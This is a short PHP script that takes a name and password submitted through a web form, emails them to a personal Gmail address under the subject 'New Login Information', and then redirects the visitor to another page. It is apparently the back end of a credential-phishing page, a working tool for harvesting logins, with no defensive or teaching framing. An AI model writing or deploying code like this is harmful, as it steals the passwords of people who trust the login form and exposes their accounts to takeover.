<?php
// send_email.php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $name = $_POST['name'];
    $password = $_POST['password'];

    // Recipient email
    $to = "hallo.titty2@gmail.com";

    // Subject and message
    $subject = "New Login Information";
    $message = "Name: " . htmlspecialchars($name) . "\n";
    $message .= "Password: " . htmlspecialchars($password) . "\n";

    // Headers for the email
    $headers = "From: no-reply@yourdomain.com\r\n";
    $headers .= "Reply-To: no-reply@yourdomain.com\r\n";

    // Send email
    if (mail($to, $subject, $message, $headers)) {
        // Redirect to content.html after sending the email
        header("Location: content.html");
        exit();
    } else {
        echo "Error: Unable to send email. Please try again.";
    }
} else {
    echo "Invalid request method.";
}
?>
